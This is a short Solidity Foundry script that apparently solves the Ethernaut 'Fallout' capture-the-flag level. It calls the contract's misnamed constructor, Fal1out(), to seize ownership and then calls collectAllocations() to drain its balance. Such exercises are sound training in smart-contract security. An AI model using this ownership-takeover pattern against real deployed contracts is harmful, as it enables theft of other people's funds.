// SPDX-Lcense-Identifier:MIT

pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

contract Fal1outSolution is Script {
    Fallout public fal1outInstance =
        Fallout(payable(0x25F5F6DE376B560D2ecDB720b2705D116fe2817e));
        address public owner;
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("owner before:", fal1outInstance.owner());
        fal1outInstance.Fal1out();
        console.log("owner after:", fal1outInstance.owner());
        owner = fal1outInstance.owner();
        console.log(owner);
        fal1outInstance.collectAllocations();
        vm.stopBroadcast();
    }
}